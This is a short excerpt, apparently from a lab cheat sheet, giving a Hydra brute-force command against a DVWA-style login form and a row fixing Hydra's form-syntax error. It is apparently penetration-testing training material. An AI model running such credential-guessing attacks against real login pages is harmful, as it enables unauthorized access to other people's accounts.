...
| **WebBruteForce** | `hydra 10.0.0.20 http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect:H=Cookie\: PHPSESSID=<your_cookie>; security=low' -l admin -P /tmp/pass.txt` |
...
| **Hydra: "optional parameters must have the format X=value"** | Hydra's `http-get-form`/`http-post-form` syntax splits its argument on unescaped colons. The failure-condition field must be prefixed `F=` (or `S=` for a success string), and any literal colon inside an optional field's value — like the `Cookie: PHPSESSID=...` header — must be escaped as `\:`, or hydra misparses the field boundaries. Use the corrected command in the table above (`F=...` and `H=Cookie\: ...`). |
